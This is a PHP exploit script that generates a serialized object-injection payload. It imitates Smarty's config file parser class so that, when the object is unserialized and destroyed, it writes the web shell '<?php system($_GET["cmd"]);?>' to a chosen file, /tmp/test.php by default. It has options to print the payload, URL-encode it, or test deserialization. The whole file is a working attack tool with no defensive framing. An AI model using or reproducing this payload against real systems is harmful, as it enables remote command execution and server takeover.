<?php
error_reporting(E_WARNING);
class TPC_yyStackEntry
{
    public $stateno; /* The state-number */
    public $major; /* The major token value.  This is the code
                     ** number for the token at this stack level */
    public $minor; /* The user-supplied minor token value.  This
                     ** is the value of the token  */
}

class Smarty_Internal_Configfileparser
{
    public $successful = true;
    public $retvalue = 0;
    public $lex;
    public $internalError = false;
	public $yyTraceFILE;
    public $yyTracePrompt;
    public $yyidx; /* Index of top element in stack */
    public $yyerrcnt; /* Shifts left before out of the error */

    public $yyTokenName = array("TEST");

    function __construct()
    {
        $this->lex = null;
        $this->smarty = null;
        $this->compiler = null;
		$this->yyTraceFILE = null;
		$this->yyidx = 0;
		$this->yyTracePrompt = '<?php system($_GET["cmd"]);?>';
		$stack_entry = new TPC_yyStackEntry;
		$stack_entry->major = 0;
		$this->yystack = array($stack_entry);
    }

	public function setTraceFile($file){
		$this->yyTraceFILE = fopen($file, "w");
	}

    public static function yy_destructor($yymajor, $yypminor)
    {
        switch ($yymajor) {
            default:
                break; /* If no destructor action specified: do nothing */
        }
    }

    public function yy_pop_parser_stack()
    {
        if (!count($this->yystack)) {
			echo "OH NOOO!";
            return;
        }
        $yytos = array_pop($this->yystack);
        if ($this->yyTraceFILE && $this->yyidx >= 0) {
            fwrite($this->yyTraceFILE,
                   $this->yyTracePrompt . 'Popping ' . $this->yyTokenName[$yytos->major] .
                   "\n");
        }
        $yymajor = $yytos->major;
        self::yy_destructor($yymajor, $yytos->minor);
        $this->yyidx --;

        return $yymajor;
    }

    public function __destruct()
    {
        while ($this->yystack !== Array()) {
            $this->yy_pop_parser_stack();
        }
        if (is_resource($this->yyTraceFILE)) {
            fclose($this->yyTraceFILE);
        }
    }
}

function serialize_object($type, $trace_file=null, $urlenc=false){
	$object = new Smarty_Internal_Configfileparser();
	if($trace_file){
		$object->setTraceFile($trace_file);
	}
	if ($type == "a"){
		$payload = array( "s" => "", "d" => $object);
	}else{
		$payload = $object;
	}
	$serial_object = serialize($payload);
	if($urlenc){
		echo urlencode($serial_object);
	}else{
		echo $serial_object;
	}
}

function deserialize_object(){
	$test = serialize_object();
	echo unserialize($test);
	return unserialize($test);
}

function desertest($testpayload){
	echo "[*] Deserializing:\n";
	echo $testpayload;
	print_r(unserialize($testpayload));
}

$args = getopt("c:f:t:u");
if (!array_key_exists("c", $args)){
	$args["c"] = null;
}
switch ($args["c"]){
	case "t":
		if (empty($args["t"])){
			die("[-] Expecting test resource");
		}
		desertest($args["t"]);
		break;
	case "s":
		$type = "o";
		if ($args["t"] && ($args["t"] == "a" || $args["t"] == "o")){
			$type = $args["t"];
		}
		$file = "/tmp/test.php";
		if ($args["f"]){
			$file = $args["f"];
		}
		$urlenc = false;
		if ($args["u"] === false){
			$urlenc = true;
		}
		serialize_object($type, $file, $urlenc);
		break;
	case "d":
		deserialize_object();
		break;
	default:
		echo "[-] Missing required argument -c [d|s|t]\n";
	
}

